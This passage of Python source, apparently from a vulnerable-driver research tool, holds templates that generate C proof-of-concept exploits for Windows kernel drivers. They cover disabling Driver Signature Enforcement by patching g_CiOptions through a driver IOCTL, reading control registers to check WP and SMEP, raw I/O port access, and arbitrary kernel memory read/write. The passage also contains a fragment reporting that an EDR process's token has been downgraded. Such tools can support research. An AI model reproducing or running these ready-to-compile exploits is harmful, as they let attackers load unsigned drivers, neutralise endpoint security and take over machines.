                printf("[+] %s token has been downgraded:\\n", found_name);
                printf("    - Integrity: Untrusted (0x0000)\\n");
                printf("    - Privileges: stripped\\n");
                printf("    - Groups: removed\\n");
                printf("[+] EDR process is now neutered (running but powerless).\\n");
                return 0;
            }}
            """)

    def _poc_dse_disable(self, finding: Finding) -> str:
        dev = self.c_device_name
        ioctl_code = self._get_ioctl(finding, 0x222000)
        return self._c_header(finding) + self._T(f"""\
            /*
             * Driver Signature Enforcement (DSE) Disable PoC.
             * Patches CI!g_CiOptions in memory to disable DSE.
             *
             * Only effective when VBS (Virtualization-Based Security) is DISABLED.
             * With VBS/HVCI enabled, CI.dll runs in VTL1 (Secure Kernel) and
             * cannot be patched from VTL0.
             *
             * g_CiOptions values:
             *   0x0000 = DSE disabled (no signature checks)
             *   0x0006 = Default (WHQL + store signing enforced)
             *   0x0008 = Test signing enabled
             *   0x000E = All signing enforced
             *
             * Attack flow:
             *   1. Driver resolves CI!g_CiOptions via CI.dll export walk
             *   2. Saves original value
             *   3. Writes 0x0000 to disable DSE
             *   4. User loads unsigned driver
             *   5. Restores original value
             *
             * Compile: x86_64-w64-mingw32-gcc poc.c -o poc.exe
             */

            #define IOCTL_DSE_DISABLE {ioctl_code}
            #define IOCTL_DSE_RESTORE 0x00222004  /* Adjust per driver RE */

            /* DSE operations */
            #define DSE_OP_DISABLE     0  /* Set g_CiOptions = 0 */
            #define DSE_OP_TEST_SIGN   1  /* Enable test signing */
            #define DSE_OP_RESTORE     2  /* Restore original value */
            #define DSE_OP_READ        3  /* Read current value */

            #pragma pack(push,1)
            typedef struct {{
                DWORD Operation;       /* DSE_OP_* */
                DWORD Value;           /* Value to write (for DSE_OP_DISABLE) */
            }} DSE_INPUT;

            typedef struct {{
                DWORD CurrentValue;    /* Current g_CiOptions */
                DWORD OriginalValue;   /* Saved original value */
                DWORD VbsEnabled;      /* 1 if VBS detected (patch will fail) */
            }} DSE_OUTPUT;
            #pragma pack(pop)

            int main(void) {{
                HANDLE hDevice = CreateFileW(L"{dev}",
                    GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
                if (hDevice == INVALID_HANDLE_VALUE) {{
                    printf("[-] Failed to open device %ls: %lu\\n", L"{dev}", GetLastError());
                    return 1;
                }}
                printf("[+] Device handle: %p\\n", hDevice);

                /* Step 1: Read current g_CiOptions */
                DSE_INPUT inp = {{0}};
                DSE_OUTPUT out = {{0}};
                inp.Operation = DSE_OP_READ;
                DWORD bytesReturned = 0;

                BOOL ok = DeviceIoControl(hDevice, IOCTL_DSE_DISABLE,
                    &inp, sizeof(inp), &out, sizeof(out), &bytesReturned, NULL);

                if (ok && bytesReturned >= sizeof(out)) {{
                    printf("[*] Current g_CiOptions: 0x%04X\\n", out.CurrentValue);
                    if (out.VbsEnabled) {{
                        printf("[!] WARNING: VBS/HVCI is ENABLED!\\n");
                        printf("[!] DSE patch will NOT work — CI runs in Secure Kernel (VTL1).\\n");
                        printf("[!] Disable VBS first: bcdedit /set hypervisorlaunchtype off\\n");
                        CloseHandle(hDevice);
                        return 1;
                    }}
                }} else {{
                    printf("[*] Could not read g_CiOptions (continuing anyway)\\n");
                }}

                /* Step 2: Disable DSE */
                printf("[*] Disabling DSE (setting g_CiOptions = 0)...\\n");
                inp.Operation = DSE_OP_DISABLE;
                inp.Value = 0;

                ok = DeviceIoControl(hDevice, IOCTL_DSE_DISABLE,
                    &inp, sizeof(inp), &out, sizeof(out), &bytesReturned, NULL);

                if (!ok) {{
                    printf("[-] DSE disable IOCTL failed: %lu\\n", GetLastError());
                    CloseHandle(hDevice);
                    return 1;
                }}
                printf("[+] DSE disabled! g_CiOptions = 0x0000\\n");
                printf("[+] You can now load unsigned drivers via sc.exe create / start.\\n");
                printf("\\n[!] IMPORTANT: Restore DSE after loading your driver:\\n");
                printf("    Run this PoC again with DSE_OP_RESTORE, or reboot.\\n");

                /* Step 3: Wait for user to load their driver */
                printf("\\nPress ENTER after loading your unsigned driver to restore DSE...\\n");
                getchar();

                /* Step 4: Restore original g_CiOptions */
                printf("[*] Restoring DSE...\\n");
                inp.Operation = DSE_OP_RESTORE;

                ok = DeviceIoControl(hDevice, IOCTL_DSE_DISABLE,
                    &inp, sizeof(inp), &out, sizeof(out), &bytesReturned, NULL);

                if (ok) {{
                    printf("[+] DSE restored to original value.\\n");
                }} else {{
                    printf("[-] Restore failed: %lu. Reboot to restore DSE.\\n",
                           GetLastError());
                }}

                CloseHandle(hDevice);
                return 0;
            }}
            """)

    def _poc_cr_access(self, finding: Finding) -> str:
        dev = self.c_device_name
        return self._c_header(finding) + self._T(f"""\
            /*
             * Control register read PoC (CR0/CR4).
             * CR0 WP bit clear -> write to read-only kernel pages
             * CR4 SMEP bit clear -> execute user-mode pages from kernel
             * WARNING: CR writes can crash the system immediately. VM only.
             */

            /* TODO: Set correct IOCTL codes by reversing the driver */
            #define IOCTL_READ_CR 0x222000

            int main(void) {{
                HANDLE hDevice = CreateFileW(L"{dev}",
                    GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
                if (hDevice == INVALID_HANDLE_VALUE) {{
                    printf("[-] Failed to open device. Error: %lu\\n", GetLastError());
                    return 1;
                }}
                printf("[+] Device handle: %p\\n", hDevice);

                unsigned int crIndex = 0;
                unsigned char outBuf[8];
                DWORD bytesReturned = 0;

                printf("[*] Reading CR0...\\n");
                BOOL result = DeviceIoControl(hDevice, IOCTL_READ_CR,
                    &crIndex, sizeof(crIndex), outBuf, sizeof(outBuf),
                    &bytesReturned, NULL);

                if (result && bytesReturned >= 8) {{
                    unsigned long long cr0 = *(unsigned long long*)outBuf;
                    int wp = (cr0 >> 16) & 1;
                    printf("[+] CR0 = 0x%016llX\\n", cr0);
                    printf("    Write Protection (WP): %s\\n", wp ? "ENABLED" : "DISABLED");
                }} else {{
                    printf("[-] Read CR0 failed. Error: %lu\\n", GetLastError());
                }}

                crIndex = 4;
                printf("[*] Reading CR4...\\n");
                result = DeviceIoControl(hDevice, IOCTL_READ_CR,
                    &crIndex, sizeof(crIndex), outBuf, sizeof(outBuf),
                    &bytesReturned, NULL);

                if (result && bytesReturned >= 8) {{
                    unsigned long long cr4 = *(unsigned long long*)outBuf;
                    int smep = (cr4 >> 20) & 1;
                    int smap = (cr4 >> 21) & 1;
                    printf("[+] CR4 = 0x%016llX\\n", cr4);
                    printf("    SMEP: %s\\n", smep ? "ENABLED" : "DISABLED");
                    printf("    SMAP: %s\\n", smap ? "ENABLED" : "DISABLED");
                }} else {{
                    printf("[-] Read CR4 failed. Error: %lu\\n", GetLastError());
                }}

                CloseHandle(hDevice);
                return 0;
            }}
            """)

    def _poc_io_port(self, finding: Finding) -> str:
        dev = self.c_device_name
        return self._c_header(finding) + self._T(f"""\
            /*
             * I/O port access PoC.
             * Direct I/O port access (IN/OUT instructions).
             * WARNING: Incorrect port I/O can crash hardware. VM only.
             */

            /* TODO: Set correct IOCTL codes by reversing the driver */
            #define IOCTL_READ_PORT  0x222000
            #define IOCTL_WRITE_PORT 0x222004

            #pragma pack(push, 1)
            typedef struct {{
                unsigned short Port;
                unsigned char  Size;  /* 1=byte, 2=word, 4=dword */
            }} PORT_REQUEST;
            #pragma pack(pop)

            int read_port(HANDLE hDevice, unsigned short port, unsigned char size) {{
                PORT_REQUEST req;
                req.Port = port;
                req.Size = size;

                unsigned char outBuf[4];
                DWORD bytesReturned = 0;

                BOOL result = DeviceIoControl(hDevice, IOCTL_READ_PORT,
                    &req, sizeof(req), outBuf, sizeof(outBuf),
                    &bytesReturned, NULL);

                if (result) {{
                    unsigned int val = *(unsigned int*)outBuf;
                    printf("[+] Port 0x%X = 0x%X\\n", port, val);
                    return 0;
                }}
                printf("[-] Read port 0x%X failed. Error: %lu\\n", port, GetLastError());
                return 1;
            }}

            int main(void) {{
                HANDLE hDevice = CreateFileW(L"{dev}",
                    GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
                if (hDevice == INVALID_HANDLE_VALUE) {{
                    printf("[-] Failed to open device. Error: %lu\\n", GetLastError());
                    return 1;
                }}
                printf("[+] Device handle: %p\\n", hDevice);

                printf("[*] Reading I/O port 0x70...\\n");
                read_port(hDevice, 0x70, 1);

                CloseHandle(hDevice);
                return 0;
            }}
            """)

    def _poc_arbitrary_rw(self, finding: Finding) -> str:
        dev = self.c_device_name
        return self._c_header(finding) + self._T(f"""\
            /*
             * Arbitrary read/write PoC.
             * The driver copies memory between user and kernel space
             * (MmCopyMemory / MmCopyVirtualMemory / ZwMapViewOfSection).
             * If address comes from user input, this gives full R/W.
             */

            /* TODO: Set correct IOCTL codes by reversing the driver */
            #define IOCTL_READ_MEM  0x222000
            #define IOCTL_WRITE_MEM 0x222004

            #pragma pack(push, 1)
            typedef struct {{
                unsigned long long Address;
                unsigned long      Size;
            }} MEM_REQUEST;
            #pragma pack(pop)

            int read_memory(HANDLE hDevice, unsigned long long addr, unsigned long size) {{
                MEM_REQUEST req;
                req.Address = addr;
                req.Size    = size;

                unsigned char *outBuf = (unsigned char*)malloc(size);
                if (!outBuf) return 1;
                DWORD bytesReturned = 0;

                printf("[*] Reading 0x%lX bytes at 0x%llX...\\n", size, addr);
                BOOL result = DeviceIoControl(hDevice, IOCTL_READ_MEM,
                    &req, sizeof(req), outBuf, size,
                    &bytesReturned, NULL);

                if (result) {{
                    printf("[+] Read %lu bytes:\\n    ", bytesReturned);
                    for (DWORD i = 0; i < bytesReturned && i < 64; i++)
                        printf("%02X ", outBuf[i]);
                    printf("\\n");
                }} else {{
                    printf("[-] Failed. Error: %lu\\n", GetLastError());
                }}
                free(outBuf);
                return result ? 0 : 1;
            }}

            int main(void) {{
                HANDLE hDevice = CreateFileW(L"{dev}",
                    GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
                if (hDevice == INVALID_HANDLE_VALUE) {{
                    printf("[-] Failed to open device. Error: %lu\\n", GetLastError());
                    return 1;
                }}
                printf("[+] Device handle: %p\\n", hDevice);

                /* Read first page of kernel memory (example) */
                read_memory(hDevice, 0xFFFFF78000000000ULL, 0x100);

                CloseHandle(hDevice);
                return 0;
            }}
            """)
